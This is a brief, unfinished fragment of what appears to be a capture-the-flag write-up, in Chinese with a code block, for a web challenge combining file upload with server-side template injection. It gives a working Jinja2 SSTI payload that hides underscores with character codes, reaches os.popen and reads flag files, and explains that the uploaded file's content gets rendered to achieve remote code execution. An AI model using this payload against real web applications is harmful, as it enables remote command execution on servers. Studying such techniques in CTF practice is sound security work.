
### WEB

#### upload?SSTI

```python
{{lipsum|attr("%c%cglobals%c%c"%(95,95,95,95))|attr("%c%cgetitem%c%c"%(95,95,95,95))("o"+"s")|attr("pop"+"en")("cat /f*")|attr("read")()}}
```

上传带有上述内容的文件，文件在被打开的时候会被渲染模板，借此达到 RCE。

后面懒了，烂尾了。